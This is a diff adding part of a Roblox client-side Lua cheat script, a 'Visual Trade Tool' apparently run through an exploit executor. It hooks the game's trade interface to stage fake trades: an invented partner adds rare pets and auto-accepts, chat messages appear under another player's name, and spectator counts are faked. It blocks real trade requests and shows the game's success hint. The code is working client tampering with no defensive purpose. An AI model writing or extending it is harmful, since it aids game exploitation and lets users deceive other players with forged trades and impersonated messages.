+            )
+
+            print(string.format(
+                "[FakeTrade] removed %s %s from %s offer (5-second lock)",
+                tag,
+                removedItem.kind or "?",
+                who
+            ))
+        end
+    end
+
+    TradeApp._on_accept_pressed = function(self, ...)
+    local s = self:_get_local_trade_state()
+    if not fakeActive or not s or s.trade_id ~= fakeTradeId then
+        return originalAccept(self, ...)
+    end
+
+    -- 🔒 respect the 5s lock on YOUR side too
+    if os.clock() < tradeUnlockAt then
+        local remaining = math.max(0, tradeUnlockAt - os.clock())
+        warn(("[FakeTrade] your side is locked for %.1fs more – can't Accept yet"):format(remaining))
+        return
+    end
+
+    print("[FakeTrade] you clicked Accept")
+
+        s.sender_offer.negotiated   = true
+        s.sender_offer.confirmed    = false
+        s.sender_offer.player_name  = LocalPlayer.Name
+
+        if s.recipient_offer and s.recipient_offer.negotiated then
+            s.current_stage = "confirmation"
+            s.offer_version = (s.offer_version or 1) + 1
+
+TradeApp:_lock_trade_for_appropriate_time()
+            tradeUnlockAt = os.clock() + LOCK_DURATION
+
+            allowOverwrite = true
+            TradeApp:_overwrite_local_trade_state(s)
+            allowOverwrite = false
+            TradeApp:refresh_all()
+
+            print("[FakeTrade] both accepted – now in confirmation stage (manual partner accept)")
+            return
+        end
+
+        allowOverwrite = true
+        TradeApp:_overwrite_local_trade_state(s)
+        allowOverwrite = false
+        TradeApp:refresh_all()
+
+                local delay = math.max(0, tonumber(acceptDelay) or 0)
+        print(("[FakeTrade] auto-accepting partner in %.2f seconds..."):format(delay))
+
+        task.delay(delay, function()
+            local s2 = getLocalState()
+            if not fakeActive or not s2 or s2.trade_id ~= fakeTradeId then return end
+            
+            s2.recipient_offer.negotiated  = true
+            s2.recipient_offer.confirmed   = false
+            s2.recipient_offer.player_name = currentTargetDisplayName
+            s2.current_stage               = "confirmation"
+            s2.offer_version               = (s2.offer_version or 1) + 1
+
+            -- ⚠️ ADD LOCK TIMER WHEN MOVING TO CONFIRMATION STAGE
+            TradeApp:_lock_trade_for_appropriate_time()
+            tradeUnlockAt = os.clock() + LOCK_DURATION
+
+            allowOverwrite = true
+            TradeApp:_overwrite_local_trade_state(s2)
+            allowOverwrite = false
+            TradeApp:refresh_all()
+
+            print("[FakeTrade] both accepted – now in confirmation stage (auto partner)")
+        end)
+    end
+
+    TradeApp._on_confirm_pressed = function(self, ...)
+        local s = self:_get_local_trade_state()
+        if not fakeActive or not s or s.trade_id ~= fakeTradeId then
+            return originalConfirm(self, ...)
+        end
+
+        print("[FakeTrade] you clicked Confirm")
+
+        s.sender_offer.negotiated  = true
+        s.sender_offer.confirmed   = true
+        s.sender_offer.player_name = LocalPlayer.Name
+
+        allowOverwrite = true
+        TradeApp:_overwrite_local_trade_state(s)
+        allowOverwrite = false
+        TradeApp:refresh_all()
+
+                local delay = math.max(0, tonumber(confirmDelay) or 0)
+        print(("[FakeTrade] auto-confirming partner in %.2f seconds..."):format(delay))
+
+        task.delay(delay, function()
+            local s2 = getLocalState()
+            if not s2 or not fakeActive or s2.trade_id ~= fakeTradeId then return end
+
+                        s2.recipient_offer.negotiated  = true
+            s2.recipient_offer.confirmed   = true
+            s2.recipient_offer.player_name = currentTargetDisplayName
+
+            allowOverwrite = true
+            TradeApp:_overwrite_local_trade_state(s2)
+            allowOverwrite = false
+            TradeApp:refresh_all()
+
+            -- ✅ record this fake trade into client-side history
+            recordFakeTradeFromState(s2)
+
+            print("[FakeTrade] both confirmed – finishing trade...")
+
+            task.delay(2, function()
+                pcall(function()
+                    if self.frame and self.frame.Parent then
+                        self.frame:Destroy()
+                    end
+                    self:hide()
+                    allowOverwrite = true
+                    self:_overwrite_local_trade_state(nil)
+                    allowOverwrite = false
+                end)
+
+                fakeActive = false
+                fakeTradeId = nil
+                stopSpectatorLoop()
+                restoreHooks()
+
+                UIManager.apps.HintApp:hint({
+                    text = "The trade was successful!";
+                    length = 3;
+                    overridable = true;
+                })
+
+                print("[FakeTrade] Trade finished.")
+                setIdleStatus()
+
+            end)
+        end)
+    end
+end
+
+---------------------------------------
+-- Add / remove partner-side items   --
+---------------------------------------
+local function addPetToPartner()
+    local s = getLocalState()
+    if not s or s.trade_id ~= fakeTradeId then
+        warn("[FakeTrade] no active visual trade – start one first")
+        return
+    end
+
+    local offer = s.recipient_offer
+    if not offer then
+        warn("[FakeTrade] recipient_offer missing in state")
+        return
+    end
+
+    -- Get a random pet kind
+    local petKind = PET_KINDS[math.random(1, #PET_KINDS)]
+    
+    -- Determine properties based on selected buttons
+    local props = {
+        mega_neon = false,
+        neon = false,
+        flyable = false,
+        rideable = false
+    }
+    
+    -- Check if any pet type is selected
+    local anySelected = false
+    for letter, selected in pairs(selectedPetTypes) do
+        if selected then anySelected = true break end
+    end
+    
+    if anySelected then
+        -- Use selected properties
+        props.mega_neon = selectedPetTypes["M"]
+        props.neon = selectedPetTypes["N"]
+        props.flyable = selectedPetTypes["F"]
+        props.rideable = selectedPetTypes["R"]
+        
+        -- If neither M nor N selected, randomly choose between neon or regular
+        if not props.mega_neon and not props.neon then
+            props.neon = math.random() > 0.5
+        end
+        
+        
+                -- If neither F nor R selected, leave both as false (just Mega/Neon pet)
+        if not props.flyable and not props.rideable then
+            props.flyable = false
+            props.rideable = false
+        end
+    else
+        -- No selection - use random from rarity presets (original behavior)
+        local propsDef = RARITY_PROPS[math.random(1, #RARITY_PROPS)]
+        props.mega_neon = propsDef.mega_neon
+        props.neon = propsDef.neon
+        props.flyable = propsDef.flyable
+        props.rideable = propsDef.rideable
+    end
+
+    offer.items = offer.items or {}
+    local newItem = {
+        unique     = "pet_" .. petKind .. "_" .. math.random(10000, 99999),
+        category   = "pets",
+        kind       = petKind,
+        properties = props,
+    }
+    table.insert(offer.items, newItem)
+
+    allowOverwrite = true
+    TradeApp:_overwrite_local_trade_state(s)
+    allowOverwrite = false
+    TradeApp:_lock_trade_for_appropriate_time()
+    tradeUnlockAt = os.clock() + LOCK_DURATION
+    TradeApp:refresh_all()
+
+    -- Build description string
+    local descParts = {}
+    if props.mega_neon then table.insert(descParts, "Mega Neon") end
+    if props.neon and not props.mega_neon then table.insert(descParts, "Neon") end
+    if props.flyable then table.insert(descParts, "Fly") end
+    if props.rideable then table.insert(descParts, "Ride") end
+    
+    local desc = table.concat(descParts, " ")
+    if desc == "" then desc = "Regular" end
+    
+    local niceName = formatPetName(petKind)
+    TradeApp:_render_message_in_trade_chat(nil,
+        string.format("%s added %s %s", currentTargetDisplayName, desc, niceName),
+        false, true
+    )
+
+    print(string.format("[FakeTrade] added %s %s to partner offer (5-second lock)", desc, petKind))
+end
+
+local function removePetFromPartner()
+    local removed = select(1, removeLastFromOffer("recipient_offer"))
+    if not removed then
+        print("[FakeTrade] no pets to remove from partner")
+        return
+    end
+
+    local tag = removed.properties and tagForProps(removed.properties) or "FR"
+    local niceName = removed.kind and formatPetName(removed.kind) or "Pet"
+    TradeApp:_render_message_in_trade_chat(nil,
+        string.format("%s removed %s %s", currentTargetDisplayName, tag, niceName),
+        false, true
+    )
+    print(string.format("[FakeTrade] removed %s %s from partner offer (5-second lock)", tag, removed.kind or "?"))
+end
+
+addButton.MouseButton1Click:Connect(addPetToPartner)
+removeButton.MouseButton1Click:Connect(removePetFromPartner)
+forceAcceptButton.MouseButton1Click:Connect(forcePartnerAccept)
+
+---------------------------
+-- Start visual trade    --
+---------------------------
+local function startVisualTrade()
+    if fakeActive then
+        local s = getLocalState()
+        if not s or s.trade_id ~= fakeTradeId then
+            warn("[FakeTrade] stale visual trade state detected – resetting.")
+            fakeActive = false
+            fakeTradeId = nil
+            stopSpectatorLoop()
+            restoreHooks()
+        else
+            warn("[FakeTrade] visual trade already running")
+            return
+        end
+    end
+
+
+    -- reset local lock when starting a brand new visual trade
+    tradeUnlockAt = 0
+
+    local targetPlayer = nil
+    if currentTargetId and currentTargetId ~= 0 then
+        targetPlayer = Players:GetPlayerByUserId(currentTargetId)
+    end
+    if not targetPlayer and currentTargetName then
+        targetPlayer = Players:FindFirstChild(currentTargetName)
+    end
+    if targetPlayer == LocalPlayer then
+        targetPlayer = nil
+    end
+
+    if targetPlayer then
+        currentTargetName = targetPlayer.Name
+        currentTargetId   = targetPlayer.UserId
+        currentTargetDisplayName = targetPlayer.Name
+        selectedNameLabel.Text = currentTargetDisplayName
+    end
+
+    local target
+    if targetPlayer then
+        target = targetPlayer
+    else
+        target = {
+            Name        = currentTargetName,
+            UserId      = currentTargetId or 0,
+            DisplayName = currentTargetDisplayName,
+        }
+    end
+
+    -- use the game's dialog exactly like before
+        -- Check if this is coming from a bot interaction (should skip dialog)
+local fromBotInteraction = _G.__ENVISION_TRADE_BYPASS or false
+
+if not fromBotInteraction then
+    -- use the game's dialog exactly like before (only for manual trades)
+    local dlg = {
+        text  = string.format("%s sent you a trade request", currentTargetDisplayName),
+        left  = "Decline",
+        right = "Accept",
+    }
+
+    -- allow ONLY this dialog through the wrapper
+    allowMockDialog = true
+    local response = UIManager.apps.DialogApp:dialog(dlg)
+    allowMockDialog = false
+
+    print("[FakeTrade] trade request response:", response)
+
+    if response ~= "Accept" then
+        print("[FakeTrade] trade declined")
+        return
+    end
+else
+    print("[FakeTrade] Bot-initiated trade - skipping dialog")
+end
+
+blockRealTrades = true
+
+    fakeTradeId = "visual_trade_" .. math.random(10000, 99999)
+
+    local state = {
+        trade_id  = fakeTradeId,
+        sender    = LocalPlayer,
+        recipient = target,
+    }
+
+    state.sender_offer = {
+        items       = {},
+        negotiated  = false,
+        confirmed   = false,
+        player_name = LocalPlayer.Name,
+    }
+
+    state.recipient_offer = {
+        items       = {},
+        negotiated  = false,
+        confirmed   = false,
+        player_name = currentTargetDisplayName,
+    }
+
+    state.current_stage               = "negotiation"
+    state.offer_version               = 1
+    state.sender_has_trade_license    = true
+    state.recipient_has_trade_license = true
+    state.busy_indicators             = {}
+    state.subscriber_count            = 1
+
+        print(string.format("[FakeTrade] setting up empty visual trade with %d max spectators...", desiredMaxSpectators))
+    print(string.format("[FakeTrade] trading with: %s (ID: %d)", currentTargetDisplayName, currentTargetId))
+
+    enableFakeTradeHooks()
+    if blockRealRequestsEnabled then
+        startBlockingRealRequests()
+    end
+
+    allowOverwrite = true
+    TradeApp:_overwrite_local_trade_state(state)
+    allowOverwrite = false
+
+    UIManager.set_app_visibility("TradeApp", true)
+    task.wait(0.4)
+    TradeApp:refresh_all()
+
+    if randomSpectatorsEnabled then
+        -- random spectator count between 1 and desiredMaxSpectators
+        startSpectatorLoop()
+    else
+        -- fixed spectator count: just set once
+        local s2 = getLocalState()
+        if s2 and s2.trade_id == fakeTradeId then
+            allowOverwrite = true
+            s2.subscriber_count = desiredMaxSpectators
+            TradeApp:_overwrite_local_trade_state(s2)
+            allowOverwrite = false
+            TradeApp:refresh_all()
+        end
+    end
+
+    print("[FakeTrade] trade window opened")
+end
+
+-- expose for bot/interactions callbacks (prevents nil call)
+_G.startVisualTrade = startVisualTrade
+if getgenv then
+    getgenv().startVisualTrade = startVisualTrade
+end
+
+startButton.MouseButton1Click:Connect(startVisualTrade)
+
+--------------------------------
+-- Intro -> panel transition  --
+--------------------------------
+local function showMainPanel()
+    -- let the tab system handle which page is visible
+    selectTab("trade")  -- was "main"
+
+    mainFrame.Visible = true
+    mainFrame.Position = UDim2.new(0, -210, 0, 100)
+
+    local tween = TweenService:Create(
+        mainFrame,
+        TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        { Position = UDim2.new(0, 10, 0, 100) }
+    )
+    tween:Play()
+
+    local introTween = TweenService:Create(
+        introFrame,
+        TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        { BackgroundTransparency = 1 }
+    )
+    introTween:Play()
+
+    task.delay(0.25, function()
+        introFrame:Destroy()
+    end)
+end
+
+introButton.MouseButton1Click:Connect(showMainPanel)
+
+----------------------------------------
+-- Chat tab: premade partner messages --
+----------------------------------------
+local chatCard = Instance.new("Frame")
+chatCard.Size = UDim2.new(1, -20, 1, -20)
+chatCard.Position = UDim2.new(0, 10, 0, 10)
+chatCard.BackgroundColor3 = Color3.fromRGB(22, 24, 36)
+chatCard.BorderSizePixel = 0
+chatCard.Parent = chatContent
+
+local chatCardCorner = Instance.new("UICorner")
+chatCardCorner.CornerRadius = UDim.new(0, 10)
+chatCardCorner.Parent = chatCard
+
+local chatTitle = Instance.new("TextLabel")
+chatTitle.Size = UDim2.new(1, -16, 0, 20)
+chatTitle.Position = UDim2.new(0, 8, 0, 6)
+chatTitle.BackgroundTransparency = 1
+chatTitle.Font = Enum.Font.GothamBold
+chatTitle.TextSize = 12
+chatTitle.TextColor3 = Color3.fromRGB(210, 215, 255)
+chatTitle.TextXAlignment = Enum.TextXAlignment.Left
+chatTitle.Text = "partner quick chat"
+chatTitle.Parent = chatCard
+
+local chatSub = Instance.new("TextLabel")
+chatSub.Size = UDim2.new(1, -16, 0, 16)
+chatSub.Position = UDim2.new(0, 8, 0, 24)
+chatSub.BackgroundTransparency = 1
+chatSub.Font = Enum.Font.Gotham
+chatSub.TextSize = 10
+chatSub.TextColor3 = Color3.fromRGB(160, 168, 220)
+chatSub.TextXAlignment = Enum.TextXAlignment.Left
+chatSub.Text = "click to send as if your partner typed it"
+chatSub.Parent = chatCard
+
+local chatList = Instance.new("ScrollingFrame")
+chatList.Size = UDim2.new(1, -16, 1, -48)
+chatList.Position = UDim2.new(0, 8, 0, 40)
+chatList.BackgroundColor3 = Color3.fromRGB(18, 20, 30)
+chatList.BorderSizePixel = 0
+chatList.ScrollBarThickness = 4
+chatList.CanvasSize = UDim2.new()
+chatList.Parent = chatCard
+
+local chatLayout = Instance.new("UIListLayout")
+chatLayout.Padding = UDim.new(0, 4)
+chatLayout.SortOrder = Enum.SortOrder.LayoutOrder
+chatLayout.Parent = chatList
+
+for _, msg in ipairs(CHAT_PRESETS) do
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(1, 0, 0, 24)
+    btn.BackgroundColor3 = Color3.fromRGB(32, 35, 52)
+    btn.BorderSizePixel = 0
+    btn.Font = Enum.Font.Gotham
+    btn.TextSize = 11
+    btn.TextXAlignment = Enum.TextXAlignment.Left
+    btn.TextColor3 = Color3.fromRGB(220, 225, 255)
+    btn.Text = "  " .. msg
+    btn.Parent = chatList
+
+    local bc = Instance.new("UICorner")
+    bc.CornerRadius = UDim.new(0, 6)
+    bc.Parent = btn
+
+    btn.MouseButton1Click:Connect(function()
+        local state = getLocalState()
+        if not state then
+            warn("[FakeTrade] no open trade – quick chat ignored")
+            return
+        end
+
+        local senderRef = state.recipient
+        if not senderRef or type(senderRef) ~= "table" then
+            senderRef = {
+                Name        = currentTargetName,
+                UserId      = currentTargetId or 0,
+                DisplayName = currentTargetDisplayName,
+            }
+        end
+
+        TradeApp:_render_message_in_trade_chat(
+            senderRef,
+            msg,
+            false,
+            false
+        )
+
+        print("[FakeTrade] partner quick-chat ->", currentTargetDisplayName, ":", msg)
+    end)
+end
+
+chatList.CanvasSize = UDim2.new(0, 0, 0, chatLayout.AbsoluteContentSize.Y)
+
+print("[FakeTrade] Visual Trade Tool loaded.")
+print("  – choose a partner (list or textbox), then click 'start visual trade'.")
+print("  – capitalization of the partner name in the trade window now follows whatever you type/click.")
